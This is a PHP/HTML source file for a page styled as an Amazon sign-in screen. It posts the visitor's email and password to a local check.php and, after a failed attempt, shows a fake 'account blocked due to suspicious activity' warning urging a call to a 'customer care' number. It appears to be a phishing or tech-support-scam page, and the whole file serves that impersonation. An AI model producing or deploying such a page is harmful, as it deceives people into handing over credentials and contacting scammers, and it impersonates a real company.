<?php
include_once('db.php');
include('check.php');
//$atmp=0;
?>
<!DOCTYPE html>
<html>
<head>
     <title>Amazon - Login</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.0/js/bootstrap.min.js"></script>
<script src="//code.jquery.com/jquery-1.11.1.min.js"></script>

<!-- jQuery library -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>

<!-- Popper JS -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>

<!-- Latest compiled JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
</head>
<style type="text/css">
     form { margin: 0px 10px; }

h2 {
  margin-top: 2px;
  margin-bottom: 2px;
}

.container { max-width: 340px; }

.divider {
  text-align: center;
  margin-top: 20px;
  margin-bottom: 5px;
}

.divider hr {
  margin: 7px 0px;
  width: 35%;
}

.left { float: left; }

.right { float: right; }
#result{
     /*color: red;*/
     display: none;
     position: relative;
     left:36.5%;
     border:1px solid maroon;
     border-radius: 5px;
     padding:5px;
     margin: 0 0 10px;
     /*width: fit-content;*/
      width:26%;
 
     
}
#result i{
  
   font-size:20px; 
   margin-left: 3px;
   
}
#result b{
  font-weight: 400;
    font-size: 17px;
    line-height: 1.255;
    color: red;
}

</style>
<body>


<center><img src="amazon_logo_no-org_mid._V153387053_.png" class="img-responsive" style="margin-top: 5%;"></center><br>

 <div id="result" style="font-size: 14px; box-sizing: content-box;"><i class="fa fa-warning"></i>&nbsp;&nbsp;<b>Your account has been block due to &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;suspicious activity</b><span><p style="color:#000; padding-left: 30px;">Please contact customer care toll<br>free number </p></span>
 </div>

<div class="container" style="margin-top: 20px;">
     <div class="row">
          <div class="panel panel-default">
          <div class="panel-body">   
          <form method="post">        
                         <div style="font-size: 25px;"> Sign In</div>
                                   <label><strong>Email(phone for mobile accounts)</strong></label>
                              <div class="form-group">
                                   <input type="text" name="email" id="email" maxlength="50" class="form-control">

                              </div>
                              <!-- <input type="text" name="count" id="count" value="" class="form-control"> -->
                              
                                   <label><strong>Password</strong></label>
                                   <span class="right"><a href="#">Forgot your password?</a></span>
                              <div class="form-group">
                                   <input  type="password" id="password" name="password" maxlength="25" class="form-control">
                              </div>
                              <div class="form-group" style="padding-top: 12px;">
                                   <button  type="button" name="submit" id="submit" class="btn btn-block" style="background-color: #f0c14b; color:#000; font-size: 15px; border-color: #000;">Sign in</button>
                              </div>
                           <div class="form-group divider">
                                   <hr class="left"><small>Sign in</small><hr class="right">
                              </div>
                       <p class="form-group"><a href="#" class="btn btn-default btn-block"  style="background-color:lightgray ;border: 1px solid gray; color:black;">Create an account</a></p>
                              <p class="form-group">By signing in you are agreeing to our <a href="#">Terms of Use</a> and our <a href="#">Privacy Policy</a></p>
                          
                    </div>
               </div>
          </div>
</div>
</center>
</form>
</body>
</html>
<script type="text/javascript">
  var count = 0;
  $('#submit').on('click', function() {
        var email=$('#email').val();
        var password=$('#password').val();
        if(email =="")
        {
          alert("Enter email");
          return false;
        }
        else if(password == "")
        {
          alert("Please enter password");
          return false;
        }
        else
        {
          $.ajax({
          type:'post',
          url:'check.php',
          data: {email:email,password:password},
           cache: false,
          success:function(data) {
            if(data == "Success"){
              window.location.href='next.php';
            }
            else{
              // alert(data);
              $('#result').show();
              count = count + 1;
              localStorage.setItem('count',count);
              var c = localStorage.getItem('count');
              if(c > 3){
               alert("Login Limit Exceeded Try to login after 30 seconds "); 
               $('#submit').prop('disabled', true);
               $('#result').hide();
               $('#email').val("");
               $('#password').val("");
               setInterval(function(){localStorage.clear();$('#submit').prop('disabled',false); alert("You can login now")},30000);
               
              }
             
            }
          }
        
       });   
      }
  });
</script>